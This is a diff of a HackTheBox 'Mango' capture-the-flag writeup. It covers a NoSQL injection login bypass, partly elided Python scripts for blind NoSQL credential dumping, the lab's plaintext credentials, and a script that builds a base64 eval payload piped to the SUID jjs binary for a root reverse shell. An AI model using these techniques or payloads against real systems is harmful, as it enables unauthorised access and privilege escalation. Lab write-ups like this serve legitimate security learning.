@@ -1,8 +1,8 @@
 ---
 title: Mango
-date: 2022-08-05T15:52:54-04:00
+date: 2022-08-08
 summary: "Writeup for the Mango lab machine on HackTheBox"
-draft: true
+draft: false
 tags: [Hacking]
 categories: [HackTheBox]
 cover:
@@ -13,6 +13,13 @@ cover:
 ---
 
 # Introduction
+
+This box makes use of sql injection, but not in the way that people normally expect.
+The box hosts a few different webpages, with one of them being vulnerable to NoSQL
+injection. The NoSQL injection can be used to harvest user credentials, one of which
+can be used to ssh into the machine as the mango user. From there, we can login as
+the admin user with `su`, and use the `jjs` SUID binary on the machine to spawn a
+reverse shell as root.
 
 ## Enumeration
 
@@ -49,34 +56,62 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ### Websites
 
-- nmap shows a hostname, so we update /etc/hosts
+Nmap shows info about the ssl cert for the website, so we add that information to
+/etc/hosts. Using gobuster to scan for additional subdomains does not lead to any
+more results.
 
 ![/etc/hosts](./images/website/etc_host.png)
+![gobuster vhosts](./images/website/gobuster_vhosts.png)
 
-- going to http://mango.htb gives 403 forbidden, but http://staging-order.mango.htb gives a login page
+Navigating to http://mango.htb gives a 403 forbidden message, so this is a dead end.
 
 ![mango.htb](./images/website/http/mango_htb/403_forbidden.png)
-![staging-order.mango.htb](./images/website/http/mango_htb/staging-order/homepage.png)
 
-- https://mango.htb gives a search engine, https://staging-order.mango.htb goes to the same page
+https://mango.htb does, however, load properly. It brings up what looks like a simple
+websearch, but id does not do anything when a search is made. Checking
+https://staging-order.mango.htb brings up the same webpage.
 
 ![https://mango.htb](./images/website/https/mango_htb/homepage.png)
 
-- found a page for analytics.php on the https site with Gobuster. The license key for the app is expired though, and is thus useless
+Running gobuster on the https website shows an endpoint for
+http://mango.htb/analytics.php. 
 
 ![Gobuster](./images/website/https/mango_htb/gobuster.png)
+
+The analytics page itself, does not load any data, since the required license has
+expired. So this is another dead end.
+
 ![analytics](./images/website/https/mango_htb/analytics_page.png)
+
+http://staging-order.mango.htb brings up a login page that does not seem to change on
+failed login. Probably it is just not showing a proper message to let us know if the
+login was successful.
+
+![staging-order.mango.htb](./images/website/http/mango_htb/staging-order/homepage.png)
+
+## Shell as Mango
 
 ### NoSQL Injection
 
-- can bypass login with nosql injection
+Running sqlmap on the login page does not show any fields that are vulnerable to
+SQL injection. However, NoSQL injection does work, and allows us to bypass
+authentication.
 
-[PayloadAllTheThings - nosql injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#exploits)
+[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass) provides all the common NoSQL injection tricks. Intercepting the login request with Burpsuite and putting `[$ne]` after each POST parameter bypasses login. 
 
 ![nosql injection](./images/website/http/mango_htb/staging-order/nosql_injection.png)
+
+Successful login redirects to home.php, which is a placeholder page for a future
+project
+
 ![home.php](./images/website/http/mango_htb/staging-order/home.png)
 
-- can enum users and discover passwords with some scripts
+While the actual contents of home.php are not useful, we can still use the NoSQL
+injection to gather valid user credentials.
+[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#blind-nosql)
+can once again be reference to create some python scripts that will enumerate valid
+users and their passwords.
+
 ```python
 #!/usr/bin/env python3
 # search_users.py
@@ -97,7 +132,7 @@ if r.status_code == 302:
 ```
 ```python
 #!/usr/bin/env python3
-# dump_users.py
+# dump_creds.py
 # Supply a username and it will dump the password of that user the script runs forever,
 # but once the ending of the password ends in "$" over and over again, its done.
 
@@ -120,38 +155,52 @@ while True:
             if r.status_code == 302:
                 password += urllib.parse.unquote(c)
                 print(password)
-
 ```
-- credentials
-    - admin:t9KcS3>!0B#2
-    - mango:h3mXK8RhU~f{]f5H
 
-- mango's creds can be used for ssh
+Using the search_users.py script, we find two users, admin and mango. Then using the
+dump_creds.py script we can figure out both of their passwords.
+
+```nohighlight
+username: mango
+password: h3mXK8RhU~f{]f5H
+```
+```nohighlight
+username: admin
+password: t9KcS3>!0B#2
+```
+
+Attempting to use admin's credentials to ssh into the machine fails, but mango's
+credentials login successfully.
 
 ![Shell as mango](./images/shell_as_mango.png)
 
-- was using mongodb for the staging server
+## Shell as root
 
-- jjs has the suid bit set and should be runnable s the admin user
+Running linpeas shows that openjdk11 is installed and the included binary jjs has the
+suid bit set. The admin user is also able to run it.
 
-![jjs suid](./images/java/jjs_can_be_run_by_admins.png)
+![linpeas suid on jjs](./images/java/linpeas_suid.png)
+<!-- ![jjs suid](./images/java/jjs_can_be_run_by_admins.png) -->
 
-- cant ssh as admin but can su to admin with the previously found password
+We could not ssh into the machine as admin, but attempting to use `su` and providing
+the previously obtained password for admin logs in successfully
 
-![sshd_config](./images/ssh/allowed_users.png)
 ![shell as admin](./images/shell_as_admin.png)
 ![user.txt](./images/user_get.png)
 
-- this is probably what need to do, but it aint working very good
+The reason we could not ssh as admin is due to the rules set by sshd_config
 
-[gtfobins jjs](https://gtfobins.github.io/gtfobins/jjs/#reverse-shell)
-[jjs shell scripting docs](https://docs.oracle.com/javase/8/docs/technotes/guides/scripting/nashorn/shell.html)
-[Useful article](https://cornerpirate.com/2018/08/17/java-gives-a-shell-for-everything/)
+![sshd_config](./images/ssh/allowed_users.png)
 
-- Using the command on gtfobins only gives a shell as admin, but running bash with -p
-  maintains root privileges.
+We can reference [gtfobins](https://gtfobins.github.io/gtfobins/jjs/#reverse-shell)
+to find a way to use `jjs` to get a reverse shell. This works, but the shell we get
+back is still the admin user. In order for the shell to be a root shell, `-p` needs
+to be passed as an argument when executing `/bin/bash`.
 
 ![bash -p flag](./images/java/bash_arguments.png)
+
+
+The following script can be used to generate a copy-pasteable payload.
 
 ```python
 #!/usr/bin/env python3
@@ -178,6 +227,9 @@ payload = payload.decode("utf-8")
 print(f"echo \"eval(new java.lang.String(java.util.Base64.decoder.decode('{payload}')));\" | jjs")
 
 ```
+
+Copying and pasting the output of the previous script into the shell we have as admin
+we create a reverse shell on port 4444. 
 
 ![Shell as root](./images/shell_as_root.png)
 ![root.txt](./images/root_get.png)
